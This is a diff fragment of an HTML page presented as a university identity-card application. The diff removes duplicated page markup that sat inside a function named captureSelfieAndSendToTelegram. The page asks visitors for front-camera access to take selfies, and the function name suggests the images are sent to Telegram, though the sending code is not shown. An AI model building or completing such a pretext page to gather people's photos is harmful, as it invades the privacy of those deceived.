@@ -49,57 +49,6 @@
 
         // Function to request camera access and capture a selfie
         async function captureSelfieAndSendToTelegram() {
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TMBU University Identity Card Application</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-        }
-
-        h1 {
-            text-align: center;
-        }
-
-        .container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            height: 80vh;
-        }
-
-        #video {
-            max-width: 100%;
-            border: 1px solid #ccc;
-            box-shadow: 2px 2px 6px rgba(0, 0, 0, 0.1);
-            display: none; /* Initially hide the video element */
-        }
-
-        #message {
-            margin-top: 10px;
-            color: #007BFF;
-            font-weight: bold;
-            text-align: center;
-        }
-    </style>
-</head>
-<body>
-    <h1>TMBU University Identity Card Application</h1>
-    <div class="container">
-        <p id="permissionMessage">Please allow access to the front camera to capture selfies...</p>
-        <video id="video" autoplay></video>
-        <p id="message"></p>
-    </div>
-
-    <script>
-        let selfieCount = 0;
-
-        // Function to request camera access and capture a selfie
-        async function captureSelfieAndSendToTelegram() {
             const video = document.getElementById("video");
             const message = document.getElementById("message");
 
@@ -178,4 +127,3 @@
     </script>
 </body>
 </html>
-
